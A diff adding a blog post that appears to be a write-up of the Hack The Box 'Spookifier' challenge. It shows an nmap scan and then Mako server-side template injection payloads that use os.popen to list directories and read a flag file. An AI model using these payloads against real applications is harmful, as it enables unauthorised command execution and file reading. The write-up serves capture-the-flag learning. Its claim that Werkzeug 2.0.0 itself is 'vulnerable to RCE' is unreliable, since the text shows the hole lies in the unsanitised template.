@@ -1,0 +1,73 @@
+---
+title: Spookifier
+pubDate: 2025-02-12
+heroImage: '../../assets/web.jpg'
+author: "Koustubh Badshah"
+description: "This is a writeup for the Spookifier challenge on Hack The Box."
+tags: ["htb", "challenge", "writeup", "mako", "SSTI", "RCE", "Werkzeug"]
+---
+
+# Spookifier
+
+## Introduction
+
+Hello fellow hackers! In this spooky realm of Hack The Box today, we are diving into the eerie world of the "Spookifier" challenge. This challenge is designed to test your skills in web application exploitation, SSTI injection. The premise is simple yet intriguing: there's a mysterious application that generates spooky names for its users, but it has a sinister twist. Users have reported that their real names are being changed without their consent, leading to chaos in their lives. Your mission, should you choose to accept it, is to uncover the secrets behind this application and put an end to its mischievous activities. 
+
+**Challenge Scenario:**
+There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
+
+### Solution
+
+The site on entering the text shows the entered text into 4 different font styles. By sending a GET request.
+```html
+<form action="/">
+    <input id="input" name="text" type="text" value="" />
+    <button id="go" type="submit">Spookify</button>
+</form>
+```
+
+Request
+```http
+GET /?text= HTTP/1.1
+Host: 154.57.164.62
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+```
+
+Nmap scan shows following results:
+```bash
+$ nmap -p 30740 -sSVC 154.57.164.62
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:38 IST
+Nmap scan report for 154-57-164-62.static.isp.htb.systems (154.57.164.62)
+Host is up (0.28s latency).
+
+PORT      STATE SERVICE VERSION
+30740/tcp open  http    Werkzeug httpd 2.0.0 (Python 3.8.15)
+|_http-title:         Name Spookifier
+|_http-server-header: Werkzeug/2.0.0 Python/3.8.15
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
+```
+
+Runs on Werkzeug/2.0.0 Python/3.8.15- Werkzeug is a comprehensive WSGI web application library. 
+This version of werkzeug is vulnerable to RCE. I tried SSTI and it was successful. 
+```
+${8*8}
+# got 64
+```
+
+On inspecting the source code I found input was being through 
+**mako** template without sanitization. 
+
+Now I executed command to get the flag and it was successful.
+```
+${self.module.cache.util.os.popen('ls').read()}
+${self.module.cache.util.os.popen('ls ../').read()} # found flag.txt
+${self.module.cache.util.os.popen('cat ../flag.txt').read()}
+
+```
